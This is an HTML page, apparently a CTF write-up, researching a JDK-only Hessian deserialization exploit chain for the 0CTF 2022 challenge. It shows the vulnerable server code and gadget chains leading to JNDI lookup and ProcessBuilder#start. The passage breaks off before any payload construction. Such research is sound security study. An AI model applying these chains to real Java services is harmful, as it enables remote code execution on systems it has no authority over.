@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="事实上该想法源自一道2022年的ctf题目，其项目地址在https:&#x2F;&#x2F;github.com&#x2F;waderwu&#x2F;My-CTF-Challenges&#x2F;tree&#x2F;master&#x2F;0ctf-2022&#x2F;hessian-onlyJdk，下载源码后即可复现原题环境。 该题目的目的是要找到一条不依赖于其他第三方依赖仅仅依赖于jdk的hessian反序列化利用链。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hessian仅在JDK下的利用链研究">
+<meta property="og:url" content="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/index.html">
+<meta property="og:site_name" content="f4nx1ng&#39;s blog">
+<meta property="og:description" content="事实上该想法源自一道2022年的ctf题目，其项目地址在https:&#x2F;&#x2F;github.com&#x2F;waderwu&#x2F;My-CTF-Challenges&#x2F;tree&#x2F;master&#x2F;0ctf-2022&#x2F;hessian-onlyJdk，下载源码后即可复现原题环境。 该题目的目的是要找到一条不依赖于其他第三方依赖仅仅依赖于jdk的hessian反序列化利用链。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/1.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/2.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/3.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/4.jpg">
+<meta property="article:published_time" content="2024-08-13T02:31:39.000Z">
+<meta property="article:modified_time" content="2024-08-13T02:38:59.331Z">
+<meta property="article:author" content="f4nx1ng">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="自动化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/1.png">
+
+
+<link rel="canonical" href="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/","path":"2024/08/13/Hessian仅在JDK下的利用链研究/","title":"Hessian仅在JDK下的利用链研究"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hessian仅在JDK下的利用链研究 | f4nx1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">f4nx1ng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#hessian%E4%BB%85%E5%9C%A8jdk%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6"><span class="nav-number">1.</span> <span class="nav-text">Hessian仅在JDK下的利用链研究</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#uidefaults.get"><span class="nav-number">1.1.</span> <span class="nav-text">UIDefaults.get</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#swinglazyvalue.createvalue"><span class="nav-number">1.2.</span> <span class="nav-text">SwingLazyValue.createValue</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#codeql%E6%9F%A5%E8%AF%A2%E5%85%A5%E5%8F%A3"><span class="nav-number">1.3.</span> <span class="nav-text">codeql查询入口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload%E6%9E%84%E9%80%A0"><span class="nav-number">1.4.</span> <span class="nav-text">payload构造</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%85%B6%E4%B8%80"><span class="nav-number">1.4.1.</span> <span class="nav-text">利用方式其一</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%85%B6%E4%BA%8C"><span class="nav-number">1.4.2.</span> <span class="nav-text">利用方式其二</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%85%B6%E4%B8%89"><span class="nav-number">1.4.3.</span> <span class="nav-text">利用方式其三</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%85%B6%E5%9B%9B"><span class="nav-number">1.4.4.</span> <span class="nav-text">利用方式其四</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B0%E7%9A%84%E5%8F%8D%E5%B0%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.4.5.</span> <span class="nav-text">新的反射利用方式</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">f4nx1ng</p>
+  <div class="site-description" itemprop="description">A big noob</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="f4nx1ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="f4nx1ng's blog">
+      <meta itemprop="description" content="A big noob">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hessian仅在JDK下的利用链研究 | f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hessian仅在JDK下的利用链研究
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-08-13 10:31:39 / 修改时间：10:38:59" itemprop="dateCreated datePublished" datetime="2024-08-13T10:31:39+08:00">2024-08-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/Hessian/" itemprop="url" rel="index"><span itemprop="name">Hessian</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>事实上该想法源自一道2022年的ctf题目，其项目地址在https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk，下载源码后即可复现原题环境。</p>
+<p>该题目的目的是要找到一条不依赖于其他第三方依赖仅仅依赖于jdk的hessian反序列化利用链。</p>
+<span id="more"></span>
+<h4 id="hessian仅在jdk下的利用链研究">Hessian仅在JDK下的利用链研究</h4>
+<p>事实上该想法源自一道2022年的ctf题目，其项目地址在https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk，下载源码后即可复现原题环境。</p>
+<p>该题目的目的是要找到一条不依赖于其他第三方依赖仅仅依赖于jdk的hessian反序列化利用链，题目的源码如下，是一个非常简单易懂的hessian反序列化输入点。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.hessian.onlyJdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;server start&quot;</span>);</span><br><span class="line">    <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8090</span>), <span class="number">0</span>);</span><br><span class="line">    server.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">    server.setExecutor(Executors.newCachedThreadPool());</span><br><span class="line">    server.start();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Welcome to 0CTF 2022!&quot;</span>;</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> t.getRequestBody();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line">        input.readObject();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        response = <span class="string">&quot;oops! something is wrong&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      t.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">      <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> t.getResponseBody();</span><br><span class="line">      os.write(response.getBytes());</span><br><span class="line">      os.close();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>题目当中还有一个限制，该题目中使用jvmtiagent替换了运行环境中的一个类——JavaUtils，在之前的利用过程中这个类是可以进行文件写入的。既然这个类被替换成了下面这个样子，那也就意味着JavaUtils类是利用不了的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.org.apache.xml.internal.security.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JavaUtils</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeBytesToFilename</span><span class="params">(String var0, <span class="type">byte</span>[] var1)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;writeBytesToFilename&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>hint当中有两个CVE漏洞：CVE-2021-43297和CVE-2021-21346</p>
+<p>1.第一个漏洞的详细情况可以参考https://paper.seebug.org/1814/说的非常详细，从源代码层面分析了漏洞的成因。那么我们简单的概括一下就是调用Hessian反序列化的时候时会触发任意对象的toString方法的，这让我们一下就想到了之前rome链当中的toStringBean，当然在这道题里面显然是不太可能的了，除了jdk和hessian该题目环境当中并没有额外的依赖。</p>
+<p>但是在该文章中给出过一个jdk原生的jndi注入利用链，同时文章当中也指出了当前利用链所存在的弱点</p>
+<ul>
+<li>javax.swing.MultiUIDefaults是peotect类，只能在javax.swing.中使用，而且Hessian2拿到了构造器，但是没有setAccessable，newInstance就没有权限</li>
+<li>所以要找链的话需要类是public的，构造器也是public的，构造器的参数个数不要紧，hessian2会自动挨个测试构造器直到成功</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure>
+<p>2.第二个漏洞的具体情况可以参考https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/该文章说的也比较详细，因为其中的注释写的非常好，能让别人一下就看懂，它给出了一个思路就是jdk本身存在一个名为Base64Data的类它有toString方法并能借此出发一整条利用链。利用链如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line">	# 2. hashCode执行了this.value.toString()，将其中value设置为Base64Data</span><br><span class="line">	com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line">		# 3. Base64Data.toString执行了this.dataHandler.getDataSource().getInputStream()，指定其中属性dataHandler为javax.activation.DataHandler</span><br><span class="line">		javax.activation.DataHandler#getDataSource</span><br><span class="line">			# 4. DataHandler.getDataSource()返回属性类型为DataSource，该属性 置为XmlDataSource</span><br><span class="line">			com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream</span><br><span class="line">				# 5. XmlDataSource 有个InputStream的属性，为getInputStream返回值，设置为CipherInputStream。</span><br><span class="line">				# 回到步骤3，执行完getInputStream之后，执行了readFrom(is)，实际调用is.read</span><br><span class="line">				javax.crypto.CipherInputStream#read -&gt; getMoreData</span><br><span class="line">					# 6. CipherInputStream.read调用this.cipher.update()，其中指定cipher为NullCipher</span><br><span class="line">					javax.crypto.NullCipher#update -&gt; chooseFirstProvider</span><br><span class="line">						# 7. NullCipher.update执行了父类的方法Cipher.chooseFirstProvider，继续执行了this.serviceIterator.hasNext(),其中serviceIterator 置为FilterIterator</span><br><span class="line">						javax.imageio.spi.FilterIterator#next					</span><br><span class="line">							# 8. FilterIterator.next执行了filter.filter()，其中filter为属性，置该属性为ContainsFilter实例</span><br><span class="line">							javax.imageio.ImageIO.ContainsFilter#filter</span><br><span class="line">								# 9. ContainsFilter.filter执行了method.invoke(elt)，其中method为类属性可控，elt为参数，为iter的next()值</span><br><span class="line">								ProcessBuilder#start</span><br></pre></td></tr></table></figure>
+<p>从两个hint结合来看，我们和容易得出一个结论，我们需要拼接一个新的利用链来取代javax.swing.MultiUIDefaults.toString，而com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString就是其中一个可能对象，但是这种方式也有人尝试过了在文章https://www.cnblogs.com/kingbridge/articles/16717030.html当中指出，该方法最终会无法正常反序列化。</p>
+<p>所以问题就转到了用谁来代替这个toString方法，在此之前我们需要先明白这半段利用链的原理。</p>
+<h5 id="uidefaults.get">UIDefaults.get</h5>
+<p>UIDefaults类型是一个HashTable的子类，它的get方法如下所示，在get方法当中又调用了getFromHashtable函数，该函数当中在拿到value是LazyValue的实现类的情况下会调用对应对象的createValue方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getFromHashtable( key );</span><br><span class="line"><span class="keyword">return</span> (value != <span class="literal">null</span>) ? value : getFromResourceBundle(key, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img data-src="/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/1.png" class>
+<p>而SwingLazyValue就是该接口的实现类之一，那么在构造UIDefaults的时候将value的值设为SwingLazyValue，那么就可以调用SwingLazyValue的create方法。</p>
+<img data-src="/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/2.png" class>
+<h5 id="swinglazyvalue.createvalue">SwingLazyValue.createValue</h5>
+<p>SwingLazyValue类的createValue是这半段利用链严格意义上的sink方法，其代码如下，简单的理解就是该函数能够调用任意类的“任意”方法，但是该方法的调用仍有限制：该方法只能调用任意类的静态方法，因为var2是一个类并不是实例化的对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">createValue</span><span class="params">(UIDefaults var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(<span class="built_in">this</span>.className);</span><br><span class="line">        <span class="comment">//var2获取目标类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> Class.forName(<span class="built_in">this</span>.className, <span class="literal">true</span>, (ClassLoader)<span class="literal">null</span>);</span><br><span class="line">        Class[] var3;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.methodName != <span class="literal">null</span>) &#123;</span><br><span class="line">            var3 = <span class="built_in">this</span>.getClassArray(<span class="built_in">this</span>.args);</span><br><span class="line">            <span class="comment">//获取目标类当中的目标方法var6</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getMethod(<span class="built_in">this</span>.methodName, var3);</span><br><span class="line">            <span class="built_in">this</span>.makeAccessible(var6);</span><br><span class="line">            <span class="comment">//调用该方法</span></span><br><span class="line">            <span class="keyword">return</span> var6.invoke(var2, <span class="built_in">this</span>.args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var3 = <span class="built_in">this</span>.getClassArray(<span class="built_in">this</span>.args);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getConstructor(var3);</span><br><span class="line">            <span class="built_in">this</span>.makeAccessible(var4);</span><br><span class="line">            <span class="keyword">return</span> var4.newInstance(<span class="built_in">this</span>.args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在了解了这两个类的运行逻辑之后，我们现在明白了，我们需要找一个类这个类的toString方法能够调用HashTable当中的get方法，根据这个思路我们可以写出一个QL文件使用CodeQL来进行查询。</p>
+<h5 id="codeql查询入口">codeql查询入口</h5>
